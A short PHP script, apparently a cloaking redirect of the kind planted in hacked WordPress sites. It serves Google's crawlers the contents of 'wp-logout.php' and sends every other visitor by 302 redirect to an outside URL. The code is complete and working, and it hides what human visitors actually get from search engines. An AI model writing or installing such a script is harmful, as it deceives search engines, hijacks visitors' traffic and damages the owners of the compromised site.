<?php
function is_google_bot() {
    $bots = [
        'Googlebot', 'Google-Site-Verification',
        'Google-InspectionTool', 'Googlebot-Mobile',
        'Googlebot-News'
    ];

    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

    foreach ($bots as $bot) {
        if (stripos($userAgent, $bot) !== false) {
            return true;
        }
    }
    return false;
}

if (is_google_bot()) {
    echo file_get_contents('wp-logout.php'); //  ke bot
    exit;
} else {
    header("Location: https://ticdigital.tic.edu.my/v2/", true, 302); // redirect user 
    exit;
}
?>